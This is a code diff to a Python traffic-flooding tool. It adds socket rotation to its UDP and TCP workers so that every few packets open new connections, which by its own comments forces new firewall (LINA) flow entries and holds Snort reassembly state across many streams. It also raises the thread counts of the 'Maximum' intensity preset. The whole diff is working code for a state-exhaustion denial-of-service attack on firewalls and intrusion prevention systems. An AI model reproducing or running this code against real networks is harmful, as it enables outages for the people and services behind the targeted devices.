@@ -260,42 +260,76 @@ def build_payload_pool(proto, mutator, dns_classes=None):
 BATCH_SIZE = 50  # Flush stats every N packets
 
 # -- UDP Worker ---------------------------------------------------------------
+# Rotate UDP sockets every _UDP_SOCK_ROTATE packets so each new socket
+# gets a fresh ephemeral source port → new LINA flow entry → new block.
+_UDP_SOCK_POOL = 8
+_UDP_SOCK_ROTATE = 10
+
 def udp_worker(proto, target, port, mutator, dns_classes):
     pool = build_payload_pool(proto, mutator, dns_classes)
     idx = random.randint(0, len(pool) - 1)
     refresh = 0
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(UDP_SEND_TIMEOUT)
     local_pkts = 0
     local_bytes = 0
     local_errs = 0
 
+    def _new_sock():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(UDP_SEND_TIMEOUT)
+        return s
+
+    sock_pool = [_new_sock() for _ in range(_UDP_SOCK_POOL)]
+    send_counts = [0] * _UDP_SOCK_POOL
+    cursor = 0
+
     while not stop_event.is_set():
+        si = cursor % _UDP_SOCK_POOL
+        cursor += 1
+
+        if send_counts[si] >= _UDP_SOCK_ROTATE:
+            try:
+                sock_pool[si].close()
+            except Exception:
+                pass
+            sock_pool[si] = _new_sock()
+            send_counts[si] = 0
+
         try:
             payload = pool[idx % len(pool)]
             idx += 1
-            sock.sendto(payload, (target, port))
+            sock_pool[si].sendto(payload, (target, port))
             local_pkts += 1
             local_bytes += len(payload)
+            send_counts[si] += 1
             delay = current_phase.get("send_delay", 0)
             if delay > 0:
                 time.sleep(delay)
-            refresh += 1
             if local_pkts >= BATCH_SIZE:
                 stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                 local_pkts = local_bytes = local_errs = 0
+            refresh += 1
             if refresh >= POOL_REFRESH_INTERVAL:
                 refresh = 0
                 pool = build_payload_pool(proto, mutator, dns_classes)
                 idx = 0
         except Exception:
             local_errs += 1
-            if local_pkts >= BATCH_SIZE or local_errs >= BATCH_SIZE:
+            try:
+                sock_pool[si].close()
+            except Exception:
+                pass
+            sock_pool[si] = _new_sock()
+            send_counts[si] = 0
+            if local_errs >= BATCH_SIZE:
                 stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                 local_pkts = local_bytes = local_errs = 0
     if local_pkts or local_errs:
         stats.record_batch(proto, local_pkts, local_bytes, local_errs)
-    sock.close()
+    for s in sock_pool:
+        try:
+            s.close()
+        except Exception:
+            pass
 
 
 # -- TCP Persistent Worker ----------------------------------------------------
@@ -305,6 +339,7 @@ def udp_worker(proto, target, port, mutator, dns_classes):
 # This forces Snort to hold partial reassembly state across POOL streams
 # simultaneously.
 _TCP_WORKER_POOL = 30
+_CONN_ROTATE_SENDS = 5  # close and reopen every N sends per slot to force new LINA flow entries
 
 def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
     pool = build_payload_pool(proto, mutator, dns_classes)
@@ -316,6 +351,7 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
 
     sock_pool = [None] * _TCP_WORKER_POOL
     pending = [None] * _TCP_WORKER_POOL
+    send_count = [0] * _TCP_WORKER_POOL
     cursor = 0
 
     def _open(slot):
@@ -328,6 +364,7 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
             s.connect((target, port))
             s.settimeout(TCP_SEND_TIMEOUT)
             sock_pool[slot] = s
+            send_count[slot] = 0
             return s
         except OSError:
             sock_pool[slot] = None
@@ -337,6 +374,7 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
         s = sock_pool[slot]
         sock_pool[slot] = None
         pending[slot] = None
+        send_count[slot] = 0
         if s:
             try: s.close()
             except Exception: pass
@@ -355,6 +393,9 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
     while not stop_event.is_set():
         slot = cursor % _TCP_WORKER_POOL
         cursor += 1
+
+        if send_count[slot] >= _CONN_ROTATE_SENDS:
+            _close(slot)
 
         if pending[slot] is not None:
             s = sock_pool[slot]
@@ -388,6 +429,7 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
                 s.sendall(payload)
             local_pkts += 1
             local_bytes += len(payload)
+            send_count[slot] += 1
         except OSError:
             _close(slot)
             local_errs += 1
@@ -621,6 +663,7 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
     local_errs = 0
 
     sock_pool = [None] * _TCP_VOL_POOL
+    send_count = [0] * _TCP_VOL_POOL
     cursor = 0
 
     def _open(slot):
@@ -635,6 +678,7 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
             s.connect((target, port))
             s.setblocking(False)
             sock_pool[slot] = s
+            send_count[slot] = 0
             return s
         except OSError:
             sock_pool[slot] = None
@@ -643,6 +687,7 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
     def _close(slot):
         s = sock_pool[slot]
         sock_pool[slot] = None
+        send_count[slot] = 0
         if s:
             try:
                 s.close()
@@ -675,6 +720,9 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
     while not stop_event.is_set():
         slot = cursor % _TCP_VOL_POOL
         cursor += 1
+
+        if send_count[slot] >= _CONN_ROTATE_SENDS:
+            _close(slot)
 
         s = sock_pool[slot]
         if s is None:
@@ -710,6 +758,7 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
                     continue
             local_pkts += 1
             local_bytes += total_sent
+            send_count[slot] += 1
         except OSError:
             _close(slot)
             local_errs += 1
@@ -842,7 +891,7 @@ INTENSITY_PRESETS = {
             {"name": "Warm-up", "send_delay": 0.00005},
             {"name": "Max",     "send_delay": 0},
         ]},
-    5: {"udp": 20, "tcp": 12, "label": "Maximum",
+    5: {"udp": 30, "tcp": 16, "label": "Maximum",
         "phases": [
             {"name": "Max",     "send_delay": 0},
         ]},
